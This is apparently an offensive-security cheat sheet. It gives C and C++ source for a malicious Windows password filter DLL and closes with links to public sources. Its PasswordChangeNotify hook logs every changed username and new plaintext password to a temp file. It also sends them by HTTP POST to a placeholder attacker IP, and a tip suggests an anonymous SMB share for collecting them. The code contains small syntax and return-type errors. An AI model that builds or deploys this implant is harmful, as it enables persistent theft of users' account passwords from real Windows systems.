# Password Change Notification

> [!INFO]
> This works from Windows 2000, XP, and later.
> > [!TIP]
> > Create an SMB share to write the credentials with anonymous authentication.

## C

```c
#include <stdio.h>
#include <windows.h>
#include <wininet.h>
#include <ntsecapi.h>

void writeToLog(const char* szString) {
    FILE* pFile = fopen("c:\\windows\\temp\\logFile.txt", "a+");
    if (NULL == pFile) {
        return;
    }
    fprintf(pFile, "%s\r\n", szString);
    fclose(pFile);
    return;
}



// Default DllMain implementation
BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
                     ) {
    OutputDebugString(L"DllMain");
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

BOOLEAN __stdcall InitializeChangeNotify(void) {
    OutputDebugString(L"InitializeChangeNotify");
    writeToLog("InitializeChangeNotify()");
    return TRUE;
}

BOOLEAN __stdcall PasswordFilter(
    PUNICODE_STRING AccountName,
    PUNICODE_STRING FullName,
    PUNICODE_STRING Password,
    BOOLEAN SetOperation) {
    OutputDebugString(L"PasswordFilter");
    return TRUE;
}

NTSTATUS __stdcall PasswordChangeNotify(
    PUNICODE_STRING UserName,
    ULONG RelativeId,
    PUNICODE_STRING NewPassword ) {
  FILE* pFile = fopen("c:\\windows\\temp\\logFile.txt", "a+");
	HINTERNET hInternet = InternetOpen(L"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	HINTERNET hSession = InternetConnect(hInternet, L"<attacker_IP>", <attacker_PORT>, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	HINTERNET hReq = HttpOpenRequest(hSession, L"POST", L"/", NULL, NULL, NULL, 0, 0);

	char* pBuf="SomeData";

	OutputDebugString(L"PasswordChangeNotify");
	if (NULL == pFile) {
        return;
    }
	fprintf(pFile, "%ws:%ws\r\n", UserName->Buffer,NewPassword->Buffer);
  fclose(pFile);
	InternetSetOption(hSession, INTERNET_OPTION_USERNAME, UserName->Buffer, UserName->Length / 2);
	InternetSetOption(hSession, INTERNET_OPTION_PASSWORD, NewPassword->Buffer, NewPassword->Length / 2);
	HttpSendRequest(hReq, NULL, 0, pBuf, strlen(pBuf));

    return 0;
}
```

## C++

```cpp
#include <cstdio>
#include <cstdlib>
#include <windows.h>
#include <wininet.h>
#include <ntsecapi.h>

void writeToLog(const char *szString) {
    FILE *pointer_file = std::fopen("C:\\Windows\\Temp\\logfile.txt", "a+");
    if (NULL == pointer_file) {
        return;
    }
    std::fprintf(pointer_file, "%s\r\n", szString);
    std::fclose(pointer_file);
    return;
}

BOOL APIENTRY DllMain(HANDLE hModule,
                      DWORD ul_reason_for_call,
                      LPVOID lpReserved) {
    OutputDebugString(L"DllMain");
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

BOOLEAN __stdcall InitializeChangeNotify(void) {
    OutputDebugString(L"InitializeChangeNotify");
    writeToLog("InitializeChangeNotify()");
    return TRUE;
}

BOOLEAN __stdcall PasswordFilter(
    PUNICODE_STRING AccountName,
    PUNICODE_STRING FullName,
    PUNICODE_STRING Password,
    BOOLEAN SetOperation
) {
    OutputDebugString(L"PasswordFilter");
    return TRUE;
}

// This part is when you run the metasploit http_basic auxilary module to capture windows plaintext credentials
NTSTATUS __stdcall PasswordChangeNotify(
    PUNICODE_STRING UserName,
    ULONG RelativeId,
    PUNICODE_STRING NewPassword
) {
    FILE *pointer_file = std::fopen("C:\\Windows\\Temp\\logfile.txt", "a+");
    HINTERNET handle_internet = InternetOpen(L"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0",INTERNET_OPEN_TYPE_DIRECT, NULL, NULL,0);
    HINTERNET handle_session = InternetConnect(handle_internet, L"<attacker_IP>", <attacker_PORT>, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0)
    HINTERNET handle_request = HttpOpenRequest(handle_session, L"POST", L"/", NULL, NULL, NULL, 0, 0);

    char *pointer_buffer = "SomeData";

    OutputDebugString(L"PasswordChangeNotify");
    if (NULL == pointer_file) {
        return;
    }

    std::fprintf(pointer_file, "%ws:%ws\r\n", UserName->Buffer, NewPassword->Buffer);
    std::fclose(pointer_file);
    InternetSetOption(handle_session, INTERNET_OPTION_USERNAME, UserName->Buffer, UserName->Length / 2);
    InternetSetOption(handle_session, INTERNET_OPTION_PASSWORD, NewPassword->Buffer, NewPassword->Length / 2);
    HttpSendRequest(handle_request, NULL, 0, pointer_buffer, strlen(pointer_buffer));

    return 0;
}
```

---
## References

### Source Repositories

- [mubix: `evilpassfilter.cpp`](https://gist.githubusercontent.com/mubix/6514311/raw/d70bc891cbc7e080b9cc6ad41135078b6abc3eab/evilpassfilter.cpp)

- [clymb3r: Misc-Windows-Hacking](https://github.com/clymb3r/Misc-Windows-Hacking)

### carnal0wnage

- [carnal0wnage: Stealing passwords every time they change](https://blog.carnal0wnage.com/2013/09/stealing-passwords-every-time-they.html)

### Hak5

- [Hak5: Persistently Hijack Windows Password in Plaintext with Mubix, Hak5 1505.2](https://www.youtube.com/watch?v=XYhudIcQ2g4)